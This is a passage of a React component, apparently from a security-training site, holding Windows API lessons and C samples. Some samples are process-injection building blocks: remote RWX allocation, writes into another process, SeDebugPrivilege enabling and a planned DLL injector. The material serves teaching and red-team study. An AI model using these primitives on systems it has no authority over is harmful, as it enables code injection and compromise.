import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { BookOpen } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lessons: Record<string, any> = {
    fundamentals: {
      title: "C/C++ WinAPI Fundamentals - Deep Dive",
      sections: [
        {
          title: "1. Windows Data Types - Why They Exist",
          content: `Microsoft created Windows-specific data types to ensure portability across different architectures (16-bit, 32-bit, 64-bit). Instead of using 'int' which might be different sizes, DWORD is ALWAYS 32 bits.

UNDERSTANDING THE NAMING:
• 'H' prefix = Handle (HMODULE, HINSTANCE)
• 'LP' prefix = Long Pointer (legacy from 16-bit Windows)
• 'P' prefix = Pointer (PVOID = void*)
• 'DW' prefix = Double Word (32-bit)
• 'Q' prefix = Quad Word (64-bit)

These types are defined in windef.h (included by windows.h). Every Windows program uses them, and understanding them is absolutely fundamental.`,
          code: `// COMPLETE TYPE REFERENCE
// ======================

// Fixed-size integers
BYTE      // 8-bit unsigned (0-255)
WORD      // 16-bit unsigned (0-65,535)
DWORD     // 32-bit unsigned (0-4,294,967,295)
QWORD     // 64-bit unsigned
LONG      // 32-bit signed
LONGLONG  // 64-bit signed

// Architecture-dependent (changes on x86 vs x64)
UINT_PTR  // Unsigned integer, pointer-sized
SIZE_T    // Size type (used for memory sizes)
ULONG_PTR // Unsigned long, pointer-sized
DWORD_PTR // DWORD, pointer-sized

// Booleans - CAREFUL!
BOOL      // 32-bit: TRUE(1) or FALSE(0)
          // WARNING: Can be ANY non-zero for TRUE
BOOLEAN   // 8-bit: TRUE or FALSE

// Pointers
PVOID     // void*
LPVOID    // void* (same as PVOID)
LPCVOID   // const void*

// String pointers
LPSTR     // char* (ANSI string)
LPCSTR    // const char* (const ANSI)
LPWSTR    // wchar_t* (Wide string)
LPCWSTR   // const wchar_t* (const Wide)

// Handles (opaque references)
HANDLE    // Generic handle
HMODULE   // Loaded module/DLL
HWND      // Window handle
HKEY      // Registry key
HDC       // Device context

// REAL-WORLD EXAMPLE
int main() {
    // Process operations
    DWORD dwPid = 1234;
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    // Memory operations
    LPVOID lpAddr = (LPVOID)0x00400000;
    SIZE_T dwSize = 0x1000;  // 4KB
    
    // String operations
    LPCWSTR szFile = L"C:\\\\test.txt";
    
    // Boolean checks
    BOOL bSuccess = ReadProcessMemory(
        hProcess, lpAddr, buffer, 
        dwSize, NULL);
    
    if (bSuccess) {
        wprintf(L"Read succeeded!\\n");
    }
    
    return 0;
}`,
          language: "c"
        },
        {
          title: "2. Handles - The Windows Security Model",
          content: `A HANDLE is Windows' way of giving you controlled access to kernel objects. You DON'T get direct pointers to kernel memory (that would be a security disaster). Instead, you get a handle - essentially a token that says "you're allowed to use this resource."

DEEP TECHNICAL DETAIL:
• Handles are indices into a per-process handle table
• Each process has its own handle table in kernel space
• When you call OpenProcess(1234), the kernel creates an entry and returns the index
• Same handle value in different processes = different objects!
• Handles are validated on every API call by the kernel

This is why you can't just use a handle from another process - it's meaningless outside your handle table.`,
          code: `// COMPLETE HANDLE LIFECYCLE
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD dwPid = 1234;
    
    // STEP 1: OPEN/CREATE
    // Get handle with specific permissions
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ |      // Read memory
        PROCESS_VM_WRITE |     // Write memory  
        PROCESS_VM_OPERATION,  // Allocate/protect
        FALSE,                 // Don't inherit
        dwPid
    );
    
    // STEP 2: VALIDATE
    if (hProcess == NULL) {
        DWORD err = GetLastError();
        wprintf(L"Failed: 0x%08X\\n", err);
        
        if (err == ERROR_ACCESS_DENIED) {
            wprintf(L"Need admin rights!\\n");
        }
        return 1;
    }
    
    wprintf(L"Handle: 0x%p\\n", hProcess);
    
    // STEP 3: USE
    // Query process info
    DWORD exitCode;
    GetExitCodeProcess(hProcess, &exitCode);
    
    if (exitCode == STILL_ACTIVE) {
        wprintf(L"Process running\\n");
    }
    
    // Read memory
    BYTE buf[100];
    SIZE_T read;
    ReadProcessMemory(
        hProcess,
        (LPCVOID)0x400000,
        buf, sizeof(buf), &read
    );
    
    // STEP 4: CLOSE - CRITICAL!
    CloseHandle(hProcess);
    // After this, hProcess is invalid!
    
    return 0;
}

// ACCESS RIGHTS EXPLAINED
// =======================

// Minimal rights (query only)
HANDLE h1 = OpenProcess(
    PROCESS_QUERY_INFORMATION,
    FALSE, pid
);

// Injection rights
HANDLE h2 = OpenProcess(
    PROCESS_CREATE_THREAD |
    PROCESS_VM_OPERATION |
    PROCESS_VM_WRITE,
    FALSE, pid
);

// Everything
HANDLE h3 = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE, pid
);

// HANDLE INHERITANCE
// ==================
SECURITY_ATTRIBUTES sa;
sa.nLength = sizeof(sa);
sa.bInheritHandle = TRUE;
sa.lpSecurityDescriptor = NULL;

HANDLE hFile = CreateFileW(
    L"log.txt",
    GENERIC_WRITE,
    0, &sa,  // Inheritable!
    CREATE_ALWAYS, 0, NULL
);

// Child process can inherit this
STARTUPINFOW si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcessW(
    NULL, L"child.exe",
    NULL, NULL,
    TRUE,  // Inherit handles!
    0, NULL, NULL,
    &si, &pi
);`,
          language: "c"
        },
        {
          title: "3. Error Handling - Professional Approach",
          content: `Every Windows API can fail. GetLastError() retrieves the thread-local error code set by the last failed call. This is CRITICAL for debugging and production code.

KEY PRINCIPLES:
1. Check return values ALWAYS
2. Call GetLastError() IMMEDIATELY after failure
3. GetLastError() is overwritten by next API call
4. Different APIs use different failure indicators (NULL, FALSE, INVALID_HANDLE_VALUE)
5. Error codes are in winerror.h

NTSTATUS vs GetLastError():
• Win32 APIs (kernel32.dll) use GetLastError() → ERROR_* codes
• Native APIs (ntdll.dll) return NTSTATUS → STATUS_* codes
• You need to handle both in advanced code`,
          code: `#include <windows.h>
#include <stdio.h>

// ERROR HANDLING PATTERNS
// =======================

// Pattern 1: Basic
void BasicPattern() {
    HANDLE h = CreateFileW(
        L"test.txt",
        GENERIC_READ, 0, NULL,
        OPEN_EXISTING, 0, NULL
    );
    
    if (h == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        wprintf(L"Error: %lu\\n", err);
        
        switch(err) {
            case ERROR_FILE_NOT_FOUND:
                wprintf(L"File not found\\n");
                break;
            case ERROR_ACCESS_DENIED:
                wprintf(L"Access denied\\n");
                break;
            case ERROR_SHARING_VIOLATION:
                wprintf(L"File in use\\n");
                break;
        }
        return;
    }
    
    // Success path
    CloseHandle(h);
}

// Pattern 2: Human-readable errors
void PrintError(DWORD code) {
    LPWSTR msg = NULL;
    
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, code,
        MAKELANGID(LANG_NEUTRAL, 
                   SUBLANG_DEFAULT),
        (LPWSTR)&msg, 0, NULL
    );
    
    if (msg) {
        wprintf(L"Error %lu: %s", code, msg);
        LocalFree(msg);
    }
}

// Pattern 3: Production-ready
BOOL SecureOpen(LPCWSTR path, 
                HANDLE *pHandle) {
    *pHandle = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (*pHandle == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        
        wprintf(L"[ERROR] Failed: %s\\n", 
                path);
        PrintError(err);
        
        // Actionable hints
        if (err == ERROR_ACCESS_DENIED) {
            wprintf(L"Try: Run as admin\\n");
        } else if (err == ERROR_FILE_NOT_FOUND) {
            wprintf(L"Try: Check path\\n");
        }
        
        return FALSE;
    }
    
    return TRUE;
}

// NTSTATUS HANDLING
// =================
#include <winternl.h>
#include <ntstatus.h>

typedef NTSTATUS (NTAPI *pNtQSI)(
    ULONG, PVOID, ULONG, PULONG);

void NativeAPIExample() {
    HMODULE hNtdll = 
        GetModuleHandleW(L"ntdll.dll");
    
    pNtQSI NtQuerySystemInformation =
        (pNtQSI)GetProcAddress(
            hNtdll, 
            "NtQuerySystemInformation"
        );
    
    BYTE buf[1024];
    ULONG ret;
    
    NTSTATUS status = 
        NtQuerySystemInformation(
            0, buf, sizeof(buf), &ret);
    
    if (!NT_SUCCESS(status)) {
        wprintf(L"NTSTATUS: 0x%08X\\n", 
                status);
        
        if (status == STATUS_ACCESS_DENIED) {
            wprintf(L"Access denied\\n");
        } else if (status == 
                   STATUS_BUFFER_TOO_SMALL) {
            wprintf(L"Need %lu bytes\\n", 
                    ret);
        }
        return;
    }
    
    wprintf(L"Success\\n");
}

// COMMON ERROR CODES
// ==================
/*
ERROR_SUCCESS            0
ERROR_FILE_NOT_FOUND     2
ERROR_ACCESS_DENIED      5
ERROR_INVALID_HANDLE     6
ERROR_NOT_ENOUGH_MEMORY  8
ERROR_INVALID_PARAMETER  87
ERROR_INSUFFICIENT_BUFFER 122
*/`,
          language: "c"
        },
        {
          title: "4. Strings & Unicode - ANSI vs Wide",
          content: `Windows is fully Unicode internally (UTF-16). Every string API has two versions:
• CreateFileA() - ANSI (char*) - slow, limited
• CreateFileW() - Wide (wchar_t*) - fast, full Unicode

The "generic" name (CreateFile) is a macro that picks one based on UNICODE definition.

RULE FOR MODERN CODE: ALWAYS use W variants explicitly!

Why? ANSI functions convert to Unicode internally anyway, so they're slower. Plus they can't handle emoji, Asian languages, etc.

Wide strings:
• Use wchar_t (2 bytes per char)
• Prefix with L: L"Hello"
• Use wcs* functions: wcslen, wcscpy_s, etc.`,
          code: `#include <windows.h>
#include <stdio.h>

// STRING FUNDAMENTALS
// ===================

// ANSI (old, avoid)
char ansi[] = "Hello";
LPSTR pAnsi = ansi;
LPCSTR pConstAnsi = "Hello";

// WIDE (use this!)
wchar_t wide[] = L"Hello";
LPWSTR pWide = wide;
LPCWSTR pConstWide = L"Hello";

// API USAGE
// =========

// BAD: ANSI version
HANDLE hA = CreateFileA(
    "C:\\\\file.txt",
    GENERIC_READ, 0, NULL,
    OPEN_EXISTING, 0, NULL
);

// GOOD: Wide version
HANDLE hW = CreateFileW(
    L"C:\\\\file.txt",
    GENERIC_READ, 0, NULL,
    OPEN_EXISTING, 0, NULL
);

// CONVERSION
// ==========

// ANSI → Wide
void A2W() {
    char ansi[] = "Hello, 世界";
    wchar_t wide[256];
    
    int len = MultiByteToWideChar(
        CP_UTF8,      // UTF-8
        0,            // Flags
        ansi,         // Source
        -1,           // Null-terminated
        wide,         // Destination
        256           // Size in wchars
    );
    
    if (len == 0) {
        wprintf(L"Failed: %lu\\n", 
                GetLastError());
        return;
    }
    
    wprintf(L"Result: %s\\n", wide);
    wprintf(L"Length: %d chars\\n", len);
}

// Wide → ANSI
void W2A() {
    wchar_t wide[] = L"Hello, 世界";
    char ansi[256];
    
    int len = WideCharToMultiByte(
        CP_UTF8,      // UTF-8
        0,            // Flags
        wide,         // Source
        -1,           // Null-terminated
        ansi,         // Destination
        256,          // Size in bytes
        NULL, NULL    // Defaults
    );
    
    if (len == 0) {
        printf("Failed: %lu\\n", 
               GetLastError());
        return;
    }
    
    printf("Result: %s\\n", ansi);
    printf("Length: %d bytes\\n", len);
}

// STRING OPERATIONS
// =================

void StringOps() {
    wchar_t buf[MAX_PATH];
    
    // Length
    size_t len = wcslen(L"test");
    
    // Copy (SAFE!)
    wcscpy_s(buf, MAX_PATH, L"Hello");
    
    // Concatenate
    wcscat_s(buf, MAX_PATH, L" World");
    
    // Compare
    int cmp = wcscmp(L"A", L"B");
    // < 0: first < second
    // = 0: equal
    // > 0: first > second
    
    // Case-insensitive
    int icmp = _wcsicmp(L"hello", 
                        L"HELLO");
    // Returns 0 (equal)
    
    // Find substring
    wchar_t *pos = wcsstr(
        L"Hello World", L"World");
    // pos points to "World"
    
    // Find character
    wchar_t *chr = wcschr(
        L"Hello", L'e');
    // chr points to "ello"
}

// FORMATTING
// ==========

void Formatting() {
    wchar_t buf[256];
    
    // Basic format
    swprintf_s(buf, 256, 
        L"PID: %lu", 1234);
    
    // Multiple values
    swprintf_s(buf, 256,
        L"Addr: 0x%p Size: 0x%zX",
        (void*)0x400000, 
        (size_t)0x1000);
    
    // Build path
    wchar_t dir[] = L"C:\\\\Temp";
    wchar_t file[] = L"out.txt";
    swprintf_s(buf, 256, 
        L"%s\\\\%s", dir, file);
    
    wprintf(L"%s\\n", buf);
}

// PRACTICAL EXAMPLE
// =================

void BuildPath() {
    wchar_t path[MAX_PATH];
    wchar_t temp[MAX_PATH];
    
    // Get temp directory
    GetTempPathW(MAX_PATH, temp);
    
    // Build full path
    swprintf_s(path, MAX_PATH,
        L"%s\\\\myapp\\\\data.bin", 
        temp);
    
    wprintf(L"Path: %s\\n", path);
    
    // Expand environment vars
    wchar_t input[] = 
        L"%PROGRAMFILES%\\\\MyApp";
    wchar_t expanded[MAX_PATH];
    
    ExpandEnvironmentStringsW(
        input, expanded, MAX_PATH);
    
    wprintf(L"Expanded: %s\\n", 
            expanded);
}

// BEST PRACTICES
// ==============
/*
1. Use wchar_t and L"" always
2. Use *W APIs explicitly
3. Use _s functions: wcscpy_s
4. Check buffer sizes
5. Use MAX_PATH for paths
6. Remember: wcslen = chars, 
   not bytes!
7. Use swprintf_s, not strcat
*/`,
          language: "c"
        },
        {
          title: "5. Essential Headers & Linking",
          content: `Windows programming requires understanding which headers provide what. windows.h is the master header, but advanced techniques need specialized headers.

KEY HEADERS:
• windows.h - Core Win32 APIs, types, constants
• winternl.h - Internal NT structures (PEB, TEB)
• tlhelp32.h - Process/thread/module enumeration  
• psapi.h - Process status information
• ntstatus.h - Native API status codes

LIBRARIES:
• kernel32.lib - Win32 APIs (usually automatic)
• ntdll.lib - Native APIs (explicit link needed)
• advapi32.lib - Security, registry, services
• user32.lib - Windows, messages, UI
• psapi.lib - Process APIs

Use #pragma comment(lib, "name.lib") to link.`,
          code: `// HEADER REFERENCE
// =================

#include <windows.h>
// Provides:
// - Basic types (DWORD, HANDLE)
// - Win32 API declarations
// - Common constants
// - winnth (PE structures)

#include <winternl.h>
// Provides:
// - PEB, TEB structures
// - Native API prototypes
// - OBJECT_ATTRIBUTES
// - UNICODE_STRING

#include <tlhelp32.h>
// Provides:
// - CreateToolhelp32Snapshot
// - Process32First/Next
// - Thread32First/Next
// - Module32First/Next

#include <psapi.h>
// Provides:
// - EnumProcesses
// - EnumProcessModules
// - GetModuleInformation
// - GetProcessMemoryInfo
#pragma comment(lib, "psapi.lib")

#include <ntstatus.h>
// Provides:
// - STATUS_SUCCESS
// - STATUS_ACCESS_DENIED
// - NT_SUCCESS() macro

#include <shlwapi.h>
// Provides:
// - PathCombine
// - PathFileExists
// - Path manipulation
#pragma comment(lib, "shlwapi.lib")

// LIBRARY LINKING
// ===============

// Method 1: Pragma (recommended)
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// Method 2: Compiler flags
// cl /Fe:prog.exe prog.c ntdll.lib

// TEMPLATES
// =========

// Basic program
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

int main() {
    wprintf(L"Hello!\\n");
    return 0;
}

// Process enumeration
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#pragma comment(lib, "psapi.lib")

int main() {
    // Enumerate processes
    HANDLE hSnap = 
        CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS, 0);
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    
    Process32FirstW(hSnap, &pe);
    do {
        wprintf(L"PID %lu: %s\\n",
            pe.th32ProcessID,
            pe.szExeFile);
    } while (Process32NextW(hSnap, &pe));
    
    CloseHandle(hSnap);
    return 0;
}

// Native API template
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pFunc)(
    PVOID, PVOID);

int main() {
    HMODULE hNtdll = 
        GetModuleHandleW(L"ntdll.dll");
    
    pFunc NtFunc = (pFunc)
        GetProcAddress(hNtdll, "NtFunc");
    
    NTSTATUS status = NtFunc(NULL, NULL);
    
    if (!NT_SUCCESS(status)) {
        wprintf(L"Failed: 0x%08X\\n", 
                status);
        return 1;
    }
    
    return 0;
}

// IMPORTANT CONSTANTS
// ===================

MAX_PATH              260
FALSE                 0
TRUE                  1
INVALID_HANDLE_VALUE  -1

// Memory
MEM_COMMIT            0x1000
MEM_RESERVE           0x2000
MEM_RELEASE           0x8000

// Protection
PAGE_NOACCESS         0x01
PAGE_READONLY         0x02
PAGE_READWRITE        0x04
PAGE_EXECUTE          0x10
PAGE_EXECUTE_READ     0x20
PAGE_EXECUTE_READWRITE 0x40

// Process access
PROCESS_ALL_ACCESS    0x1F0FFF
PROCESS_TERMINATE     0x0001
PROCESS_VM_READ       0x0010
PROCESS_VM_WRITE      0x0020
PROCESS_VM_OPERATION  0x0008

// File access
GENERIC_READ          0x80000000
GENERIC_WRITE         0x40000000
GENERIC_EXECUTE       0x20000000

// COMPLETE WORKING EXAMPLE
// ========================

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "psapi.lib")

DWORD FindProcess(LPCWSTR name) {
    HANDLE hSnap = 
        CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS, 0);
    
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return 0;
    }
    
    DWORD pid = 0;
    do {
        if (_wcsicmp(pe.szExeFile, 
                     name) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnap, &pe));
    
    CloseHandle(hSnap);
    return pid;
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: %s <process>\\n",
                argv[0]);
        return 1;
    }
    
    DWORD pid = FindProcess(argv[1]);
    
    if (pid == 0) {
        wprintf(L"Process not found\\n");
        return 1;
    }
    
    wprintf(L"Found PID: %lu\\n", pid);
    
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, pid
    );
    
    if (hProc == NULL) {
        wprintf(L"Failed to open: %lu\\n",
                GetLastError());
        return 1;
    }
    
    HMODULE hMods[1024];
    DWORD needed;
    
    if (EnumProcessModules(
            hProc, hMods, sizeof(hMods),
            &needed)) {
        
        DWORD count = needed / sizeof(HMODULE);
        wprintf(L"Modules: %lu\\n\\n", count);
        
        for (DWORD i = 0; i < count; i++) {
            wchar_t name[MAX_PATH];
            
            GetModuleFileNameExW(
                hProc, hMods[i],
                name, MAX_PATH
            );
            
            wprintf(L"[%3lu] %s\\n", 
                    i, name);
        }
    }
    
    CloseHandle(hProc);
    return 0;
}`,
          language: "c"
        }
      ]
    },
    "windows-internals": {
      title: "Windows Internals & Win32 API - Advanced",
      sections: [
        {
          title: "Process Architecture Deep Dive",
          content: `A process is a container for execution with its own:
• Virtual address space (4GB on x86, 128TB on x64)
• Handle table (references to kernel objects)
• Primary token (security context/privileges)
• At least one thread (unit of execution)

In kernel, a process is represented by EPROCESS structure. In user-mode, you interact via handles. The Process Environment Block (PEB) contains user-mode process info.

KEY CONCEPT: Processes don't execute code - threads do! A process is just the environment where threads run.`,
          code: `// PROCESS CREATION
#include <windows.h>

void CreateProcessExample() {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create process suspended
    BOOL success = CreateProcessW(
        NULL,                  // App name
        L"notepad.exe",        // Command
        NULL, NULL,            // Security
        FALSE,                 // Inherit handles
        CREATE_SUSPENDED,      // Suspended!
        NULL,                  // Environment
        NULL,                  // Current dir
        &si, &pi               // Out params
    );
    
    if (!success) {
        wprintf(L"Failed: %lu\\n", 
                GetLastError());
        return;
    }
    
    wprintf(L"Created:\\n");
    wprintf(L"  PID: %lu\\n", 
            pi.dwProcessId);
    wprintf(L"  TID: %lu\\n", 
            pi.dwThreadId);
    wprintf(L"  hProcess: 0x%p\\n", 
            pi.hProcess);
    wprintf(L"  hThread: 0x%p\\n", 
            pi.hThread);
    
    // Process is suspended!
    // Can inject code here...
    
    // Resume
    ResumeThread(pi.hThread);
    
    // Wait for exit
    WaitForSingleObject(
        pi.hProcess, INFINITE);
    
    DWORD exitCode;
    GetExitCodeProcess(
        pi.hProcess, &exitCode);
    wprintf(L"Exited: %lu\\n", exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// PROCESS ENUMERATION
void EnumerateProcesses() {
    DWORD pids[1024];
    DWORD needed;
    
    EnumProcesses(pids, sizeof(pids), 
                  &needed);
    
    DWORD count = needed / sizeof(DWORD);
    
    for (DWORD i = 0; i < count; i++) {
        if (pids[i] == 0) continue;
        
        HANDLE h = OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION,
            FALSE, pids[i]
        );
        
        if (h) {
            wchar_t name[MAX_PATH];
            DWORD size = MAX_PATH;
            
            QueryFullProcessImageNameW(
                h, 0, name, &size);
            
            wprintf(L"[%5lu] %s\\n", 
                    pids[i], name);
            
            CloseHandle(h);
        }
    }
}

// PEB ACCESS
#include <winternl.h>

void ReadPEB(HANDLE hProc) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    
    typedef NTSTATUS (NTAPI *pNtQIP)(
        HANDLE, PROCESSINFOCLASS,
        PVOID, ULONG, PULONG
    );
    
    HMODULE hNtdll = 
        GetModuleHandleW(L"ntdll.dll");
    pNtQIP NtQueryInformationProcess =
        (pNtQIP)GetProcAddress(
            hNtdll, 
            "NtQueryInformationProcess"
        );
    
    NTSTATUS status = 
        NtQueryInformationProcess(
            hProc, ProcessBasicInformation,
            &pbi, sizeof(pbi), &len
        );
    
    if (NT_SUCCESS(status)) {
        wprintf(L"PEB: 0x%p\\n", 
                pbi.PebBaseAddress);
        
        // Read PEB
        PEB peb;
        SIZE_T read;
        ReadProcessMemory(
            hProc, pbi.PebBaseAddress,
            &peb, sizeof(peb), &read
        );
        
        wprintf(L"ImageBase: 0x%p\\n",
                peb.ImageBaseAddress);
        wprintf(L"BeingDebugged: %d\\n",
                peb.BeingDebugged);
    }
}`,
          language: "c"
        },
        {
          title: "Virtual Memory Management",
          content: `Every process has its own virtual address space - a flat, contiguous range of addresses. On x64, it's 128TB (0x0000000000000000 to 0x00007FFFFFFFFFFF for user mode).

Virtual addresses don't directly correspond to physical RAM - the Memory Management Unit (MMU) translates them using page tables.

MEMORY STATES:
• FREE - Not allocated
• RESERVED - Address space reserved but no physical backing
• COMMITTED - Has physical storage (RAM or pagefile)

PROTECTION:
PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE

This is the foundation for process injection!`,
          code: `#include <windows.h>

// ALLOCATE MEMORY
void AllocateMemory() {
    // In current process
    LPVOID pLocal = VirtualAlloc(
        NULL,                    // Address
        0x1000,                  // 4KB
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pLocal) {
        wprintf(L"Allocated: 0x%p\\n", 
                pLocal);
        
        // Use memory
        memset(pLocal, 0x41, 0x1000);
        
        // Free
        VirtualFree(pLocal, 0, 
                    MEM_RELEASE);
    }
}

// ALLOCATE IN REMOTE PROCESS
void RemoteAllocate(HANDLE hProc) {
    LPVOID pRemote = VirtualAllocEx(
        hProc,                   // Target
        NULL,                    // Address
        0x1000,                  // Size
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE   // RWX!
    );
    
    if (!pRemote) {
        wprintf(L"Failed: %lu\\n",
                GetLastError());
        return;
    }
    
    wprintf(L"Remote: 0x%p\\n", pRemote);
    
    // Write data
    BYTE data[] = {0x90, 0x90, 0x90};
    SIZE_T written;
    
    WriteProcessMemory(
        hProc, pRemote,
        data, sizeof(data),
        &written
    );
    
    wprintf(L"Wrote %zu bytes\\n", written);
}

// CHANGE PROTECTION
void ProtectMemory(LPVOID addr) {
    DWORD oldProtect;
    
    BOOL ok = VirtualProtect(
        addr,
        0x1000,
        PAGE_EXECUTE_READ,  // New
        &oldProtect         // Old
    );
    
    if (ok) {
        wprintf(L"Old: 0x%08X\\n", 
                oldProtect);
    }
}

// QUERY MEMORY
void QueryMemory(LPVOID addr) {
    MEMORY_BASIC_INFORMATION mbi;
    
    SIZE_T result = VirtualQuery(
        addr, &mbi, sizeof(mbi)
    );
    
    if (result) {
        wprintf(L"Base: 0x%p\\n", 
                mbi.BaseAddress);
        wprintf(L"Size: 0x%zX\\n",
                mbi.RegionSize);
        wprintf(L"State: 0x%08X\\n",
                mbi.State);
        wprintf(L"Protect: 0x%08X\\n",
                mbi.Protect);
        wprintf(L"Type: 0x%08X\\n",
                mbi.Type);
    }
}

// ENUMERATE MEMORY REGIONS
void EnumerateMemory(HANDLE hProc) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    while (VirtualQueryEx(
            hProc, addr, 
            &mbi, sizeof(mbi))) {
        
        if (mbi.State == MEM_COMMIT) {
            wprintf(L"0x%016p - 0x%016p",
                    mbi.BaseAddress,
                    (BYTE*)mbi.BaseAddress + 
                    mbi.RegionSize);
            
            wprintf(L" [%6zuKB] ", 
                    mbi.RegionSize / 1024);
            
            // Protection
            if (mbi.Protect & PAGE_EXECUTE)
                wprintf(L"X");
            else if (mbi.Protect & 
                     PAGE_EXECUTE_READ)
                wprintf(L"RX");
            else if (mbi.Protect & 
                     PAGE_EXECUTE_READWRITE)
                wprintf(L"RWX");
            else if (mbi.Protect & 
                     PAGE_READWRITE)
                wprintf(L"RW");
            else if (mbi.Protect & 
                     PAGE_READONLY)
                wprintf(L"R");
            
            wprintf(L"\\n");
        }
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
}`,
          language: "c"
        }
      ]
    },
    labs: {
      title: "Practical Labs - Build Real Tools",
      sections: [
        {
          title: "Introduction to Security Tool Development",
          content: `Welcome to the Practical Labs! Here you'll build real security tools step-by-step. These tools are used by security professionals, penetration testers, and red teamers to assess system security.

WHAT YOU'LL BUILD:
1. Process Memory Dumper - Extract process memory for analysis
2. Memory Scanner - Find patterns in process memory
3. Simple DLL Injector - Inject code into running processes

LEGAL & ETHICAL NOTE:
These tools are for educational purposes and legitimate security research only. Use them only on systems you own or have explicit written permission to test. Unauthorized use is illegal.

PREREQUISITES:
• Complete C/C++ WinAPI Fundamentals module
• Understanding of Windows process architecture
• Visual Studio or MinGW-w64 compiler
• Windows SDK installed

DEVELOPMENT ENVIRONMENT:
• OS: Windows 10/11
• Compiler: Visual Studio 2019+ or MinGW-w64
• Debugger: x64dbg or WinDbg
• Administrator privileges required for most operations`,
          code: `// PROJECT SETUP
// =============

// Visual Studio:
// 1. Create new C++ Console Application
// 2. Project Properties -> C/C++ -> General -> Warning Level: /W4
// 3. Project Properties -> Linker -> System -> SubSystem: Console
// 4. Add required libraries in code with #pragma comment

// MinGW-w64:
// gcc tool.c -o tool.exe -lpsapi -ladvapi32 -municode

// Common headers for all labs:
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// Enable SE_DEBUG_PRIVILEGE for all labs
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken)) {
        wprintf(L"[!] OpenProcessToken failed: %lu\\n", 
                GetLastError());
        return FALSE;
    }
    
    if (!LookupPrivilegeValueW(NULL, 
            SE_DEBUG_NAME, &luid)) {
        wprintf(L"[!] LookupPrivilegeValue failed: %lu\\n",
                GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(hToken, FALSE, 
            &tp, sizeof(tp), NULL, NULL)) {
        wprintf(L"[!] AdjustTokenPrivileges failed: %lu\\n",
                GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        wprintf(L"[!] Not all privileges assigned\\n");
        wprintf(L"[!] Run as Administrator!\\n");
        CloseHandle(hToken);
        return FALSE;
    }
    
    CloseHandle(hToken);
    wprintf(L"[+] SeDebugPrivilege enabled\\n");
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "Lab 1: Process Memory Dumper",
          content: `Build a tool that dumps the entire memory space of a target process to disk for offline analysis. This is essential for malware analysis, memory forensics, and reverse engineering.

HOW IT WORKS:
1. Find target process by name or PID
2. Open process with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
3. Enumerate all memory regions using VirtualQueryEx
4. Read committed, readable memory regions
5. Write regions to individual files with metadata
6. Create a map file describing the memory layout

KEY CONCEPTS:
• Memory regions have different states (MEM_COMMIT, MEM_RESERVE, MEM_FREE)
• Only committed memory contains actual data
• Memory protection flags determine readability
• Virtual address space is sparse - many gaps
• PE image sections (.text, .data, .rdata) appear as separate regions

WHAT YOU'LL LEARN:
• Process enumeration techniques
• Virtual memory traversal
• Memory protection flags
• Error handling for partial reads
